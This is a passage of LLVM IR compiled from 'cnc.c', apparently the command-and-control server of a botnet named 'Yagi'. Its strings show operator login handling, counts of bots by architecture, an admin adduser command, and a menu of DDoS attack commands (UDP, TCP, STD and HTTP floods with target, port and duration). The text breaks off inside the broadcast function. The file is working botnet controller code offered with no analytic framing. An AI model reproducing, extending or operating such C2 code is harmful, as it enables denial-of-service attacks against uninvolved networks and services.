; ModuleID = 'cnc.c'
source_filename = "cnc.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8, [30 x i8] }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.account = type { [200 x i8], [200 x i8], [200 x i8], [200 x i8], i32 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.in_addr = type { i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.telnetListenerArgs = type { i32, i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@ppc = dso_local global i32 0, align 4
@sh4 = dso_local global i32 0, align 4
@x86 = dso_local global i32 0, align 4
@armv4 = dso_local global i32 0, align 4
@armv7 = dso_local global i32 0, align 4
@mips = dso_local global i32 0, align 4
@m68k = dso_local global i32 0, align 4
@debug = dso_local global i32 0, align 4
@sparc = dso_local global i32 0, align 4
@mipsel = dso_local global i32 0, align 4
@boxes = dso_local global i32 0, align 4
@unknown = dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"Yagi\00", align 1
@ss_name = dso_local global i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.2 = private unnamed_addr constant [5 x i8] c"Cult\00", align 1
@ss_copyright = dso_local global i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), align 8
@.str.3 = private unnamed_addr constant [4 x i8] c"1.0\00", align 1
@ss_ver = dso_local global i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), align 8
@.str.4 = private unnamed_addr constant [5 x i8] c"null\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"plan1\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"plan2\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"plan3\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@plans = dso_local global [5 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)], align 16
@.str.9 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.10 = private unnamed_addr constant [61 x i8] c"\1B[0m(\1B[0;36mclient\1B[0m@\1B[1;35mYagi\1B[0m)\1B[0;31m~\1B[0;32m> \1B[0m\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.11 = private unnamed_addr constant [23 x i8] c"\1B[34m%s \1B[32mjoined.\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [21 x i8] c"\1B[34m%s \1B[31mleft.\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.16 = private unnamed_addr constant [63 x i8] c"\0D\0A\1B[0m(\1B[0;36mclient\1B[0m@\1B[1;35mYagi\1B[0m)\1B[0;31m~\1B[0;32m> \1B[0m\00", align 1
@.str.17 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"!* LOLNOBYE\0A\00", align 1
@.str.20 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"!* BIGEPS ON\0A\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.24 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.25 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"arch \00", align 1
@.str.27 = private unnamed_addr constant [19 x i8] c"IP: %s | Arch: %s\0A\00", align 1
@.str.28 = private unnamed_addr constant [39 x i8] c"echo '%s' >> files/bot_connections.log\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.30 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.31 = private unnamed_addr constant [10 x i8] c"timed-out\00", align 1
@.str.32 = private unnamed_addr constant [51 x i8] c"%c]0;Open Connections: %d | Users Connected: %d %c\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.33 = private unnamed_addr constant [11 x i8] c"logins.txt\00", align 1
@.str.34 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.35 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"X86_32\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.41 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.43 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.46 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.47 = private unnamed_addr constant [12 x i8] c"%s %s %s %s\00", align 1
@accounts = internal global [15 x %struct.account] zeroinitializer, align 16
@.str.48 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.49 = private unnamed_addr constant [30 x i8] c"\1B[1;35mUsername\1B[0;32m: \1B[30m\00", align 1
@.str.50 = private unnamed_addr constant [30 x i8] c"\1B[1;35mPassword\1B[0;32m: \1B[30m\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.52 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.53 = private unnamed_addr constant [46 x i8] c"\1B[34mError, Incorrect Login Credentials\1B[0m\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [26 x i8] c"files/failed_attempts.log\00", align 1
@.str.55 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.56 = private unnamed_addr constant [27 x i8] c"Failed Login Attempt (%s)\0A\00", align 1
@.str.57 = private unnamed_addr constant [42 x i8] c"echo '%s' >> files/client_connections.log\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@adminstatus = dso_local global i32 0, align 4
@.str.59 = private unnamed_addr constant [62 x i8] c"\1B[33mAdmin\1B[0m(\1B[34m%s\1B[33m:\1B[34m%s\1B[0m) \1B[32mlogged in\1B[0m.\0A\00", align 1
@.str.60 = private unnamed_addr constant [42 x i8] c"\1B[34m%s\1B[33m:\1B[34m%s \1B[32mlogged in\1B[0m.\0A\00", align 1
@availablebots = dso_local global i32 0, align 4
@.str.61 = private unnamed_addr constant [56 x i8] c"\1B[0m(\1B[1;35mYagi\1B[0m) Setting up virtual terminal .. \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [54 x i8] c"\1B[0mWelcome \1B[0;32m%s \1B[0mto \1B[1;35mYagi \1B[0mC2. \0D\0A\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.65 = private unnamed_addr constant [27 x i8] c"\1B[33mcls - Clears screen\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [25 x i8] c"info - Shows yagi info\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [41 x i8] c"cmds - Shows available attack commands\0D\0A\00", align 1
@.str.68 = private unnamed_addr constant [25 x i8] c"bots - Shows bot count\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [42 x i8] c"online - Shows all online users with id\0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [46 x i8] c"admin - Shows available commands for admins\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [49 x i8] c"resolve - Resolves domain and returns ipv4\1B[0m\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.74 = private unnamed_addr constant [37 x i8] c"\1B[34myagi.users [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.75 = private unnamed_addr constant [39 x i8] c"\1B[34myagi.powerpc [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.76 = private unnamed_addr constant [35 x i8] c"\1B[34myagi.sh4 [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.77 = private unnamed_addr constant [35 x i8] c"\1B[34myagi.x86 [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.78 = private unnamed_addr constant [36 x i8] c"\1B[34myagi.arm4 [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.79 = private unnamed_addr constant [36 x i8] c"\1B[34myagi.arm7 [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.80 = private unnamed_addr constant [36 x i8] c"\1B[34myagi.mips [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.81 = private unnamed_addr constant [36 x i8] c"\1B[34myagi.m68k [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.82 = private unnamed_addr constant [37 x i8] c"\1B[34myagi.sparc [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.83 = private unnamed_addr constant [38 x i8] c"\1B[34myagi.mipsel [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.84 = private unnamed_addr constant [39 x i8] c"\1B[34myagi.unknown [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.85 = private unnamed_addr constant [37 x i8] c"\1B[34myagi.total [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.86 = private unnamed_addr constant [41 x i8] c"\1B[34myagi.available [\1B[33m%d\1B[34m]\0D\0A\1B[0m\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"info\00", align 1
@.str.88 = private unnamed_addr constant [42 x i8] c"\1B[1;35mYagi \1B[0;33mcoded by \1B[0;34mCult\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.91 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.92 = private unnamed_addr constant [36 x i8] c"\1B[0m(\1B[1;35mResolve\1B[0m) %s -> %s\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.95 = private unnamed_addr constant [24 x i8] c"echo '%s' >> logins.txt\00", align 1
@.str.96 = private unnamed_addr constant [38 x i8] c"\1B[33m%s\1B[0m added user [\1B[34m%s\1B[0m]\0A\00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"\1B[33m%s\1B[0m added user [\1B[34m%s\1B[0m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [32 x i8] c"%s\1B[31mPermission Denied!\1B[0m\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [11 x i8] c"ADDUSER - \00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"online\00", align 1
@.str.101 = private unnamed_addr constant [34 x i8] c"\1B[0mID(\1B[33m%d\1B[0m) \1B[36m%s\1B[0m\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"cmds\00", align 1
@.str.103 = private unnamed_addr constant [5 x i8] c"CMDS\00", align 1
@.str.104 = private unnamed_addr constant [51 x i8] c"\1B[0m---\1B[0;33m Available Attack Commands \1B[0m---\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [48 x i8] c"UDP: @udp <target> <port> <time> <packetsize>\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [58 x i8] c"TCP: @tcp <target> <port> <time> <packetsize> <flag(s)>\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [48 x i8] c"STD: @std <target> <port> <time> <packetsize>\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [63 x i8] c"HTTP: @http <method> <target> <port> <path> <time> <threads>\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.110 = private unnamed_addr constant [50 x i8] c"\1B[0m---\1B[0;33m Available Admin Commands \1B[0m---\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [61 x i8] c"ADDUSER: adduser <username> <password> <admin/user> <plan>\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [24 x i8] c"KICK: kick <user(id)>\0D\0A\00", align 1
@.str.113 = private unnamed_addr constant [28 x i8] c"\1B[31m%s, Admins Only!\1B[0m\0D\0A\00", align 1
@.str.114 = private unnamed_addr constant [18 x i8] c"Permission Denied\00", align 1
@.str.115 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.116 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.117 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.119 = private unnamed_addr constant [7 x i8] c"ONLINE\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"COUNT\00", align 1
@.str.121 = private unnamed_addr constant [17 x i8] c"[%s Used: \22%s\22]\0A\00", align 1
@.str.122 = private unnamed_addr constant [17 x i8] c"[%s Said: \22%s\22]\0A\00", align 1
@.str.123 = private unnamed_addr constant [17 x i8] c"files/report.sql\00", align 1
@.str.124 = private unnamed_addr constant [28 x i8] c"[Reporting User: %s]: \22%s\22\0A\00", align 1
@.str.125 = private unnamed_addr constant [68 x i8] c"\1B[33mAdmin\1B[0m(\1B[34m%s\1B[33m:\1B[34m%s\1B[33m\1B[0m) \1B[31mlogged out\1B[0m.\0A\00", align 1
@.str.126 = private unnamed_addr constant [43 x i8] c"\1B[34m%s\1B[33m:\1B[34m%s \1B[31mlogged out\1B[0m.\0A\00", align 1
@.str.127 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.128 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.130 = private unnamed_addr constant [33 x i8] c"Usage: %s [bot-port] [threads] \0A\00", align 1
@.str.131 = private unnamed_addr constant [41 x i8] c"\1B[0m(\1B[1;35mYagi\1B[0m) Socket opened ..\0A\0A\00", align 1
@.str.132 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.133 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"yagi\00", align 1
@string = dso_local global [2048 x i8] zeroinitializer, align 16
@.str.135 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.136 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.137 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.138 = private unnamed_addr constant [36 x i8] c"Fuck Boy Change The Port You idiot\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @resolvehttp(i8* %0, i8* %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.in_addr**, align 8
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %6, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0)) #8
  store i32 1, i32* %3, align 4
  br label %40

13:                                               ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %6, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = bitcast i8** %16 to %struct.in_addr**
  store %struct.in_addr** %17, %struct.in_addr*** %7, align 8
  store i32 0, i32* %8, align 4
  br label %18

18:                                               ; preds = %36, %13
  %19 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %19, i64 %21
  %23 = load %struct.in_addr*, %struct.in_addr** %22, align 8
  %24 = icmp ne %struct.in_addr* %23, null
  br i1 %24, label %25, label %39

25:                                               ; preds = %18
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %28 = load i32, i32* %8, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %27, i64 %29
  %31 = load %struct.in_addr*, %struct.in_addr** %30, align 8
  %32 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %31, i32 0, i32 0
  %33 = load i32, i32* %32, align 4
  %34 = call i8* @inet_ntoa(i32 %33) #8
  %35 = call i8* @strcpy(i8* %26, i8* %34) #8
  store i32 0, i32* %3, align 4
  br label %40

36:                                               ; No predecessors!
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  br label %18, !llvm.loop !6

39:                                               ; preds = %18
  store i32 1, i32* %3, align 4
  br label %40

40:                                               ; preds = %39, %25, %12
  %41 = load i32, i32* %3, align 4
  ret i32 %41
}

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !8

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10, !llvm.loop !9

28:                                               ; preds = %10
  br label %29

29:                                               ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

33:                                               ; preds = %29
  %34 = call i16** @__ctype_b_loc() #10
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

48:                                               ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

50:                                               ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29, !llvm.loop !10

53:                                               ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

55:                                               ; preds = %71, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %74

59:                                               ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

71:                                               ; preds = %59
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  br label %55, !llvm.loop !11

74:                                               ; preds = %55
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 0, i8* %80, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #3

; Function Attrs: nounwind readnone willreturn
declare i16** @__ctype_b_loc() #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @util_trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %25, %1
  %11 = call i16** @__ctype_b_loc() #10
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

25:                                               ; preds = %10
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %4, align 4
  br label %10, !llvm.loop !12

28:                                               ; preds = %10
  br label %29

29:                                               ; preds = %50, %28
  %30 = load i32, i32* %5, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp sge i32 %30, %31
  br i1 %32, label %33, label %48

33:                                               ; preds = %29
  %34 = call i16** @__ctype_b_loc() #10
  %35 = load i16*, i16** %34, align 8
  %36 = load i8*, i8** %2, align 8
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds i8, i8* %36, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i16, i16* %35, i64 %42
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = and i32 %45, 8192
  %47 = icmp ne i32 %46, 0
  br label %48

48:                                               ; preds = %33, %29
  %49 = phi i1 [ false, %29 ], [ %47, %33 ]
  br i1 %49, label %50, label %53

50:                                               ; preds = %48
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, -1
  store i32 %52, i32* %5, align 4
  br label %29, !llvm.loop !13

53:                                               ; preds = %48
  %54 = load i32, i32* %4, align 4
  store i32 %54, i32* %3, align 4
  br label %55

55:                                               ; preds = %71, %53
  %56 = load i32, i32* %3, align 4
  %57 = load i32, i32* %5, align 4
  %58 = icmp sle i32 %56, %57
  br i1 %58, label %59, label %74

59:                                               ; preds = %55
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %3, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = load i8*, i8** %2, align 8
  %66 = load i32, i32* %3, align 4
  %67 = load i32, i32* %4, align 4
  %68 = sub nsw i32 %66, %67
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %65, i64 %69
  store i8 %64, i8* %70, align 1
  br label %71

71:                                               ; preds = %59
  %72 = load i32, i32* %3, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %3, align 4
  br label %55, !llvm.loop !14

74:                                               ; preds = %55
  %75 = load i8*, i8** %2, align 8
  %76 = load i32, i32* %3, align 4
  %77 = load i32, i32* %4, align 4
  %78 = sub nsw i32 %76, %77
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %75, i64 %79
  store i8 0, i8* %80, align 1
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2, i32 %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  %16 = alloca %struct.tm*, align 8
  %17 = alloca i8*, align 8
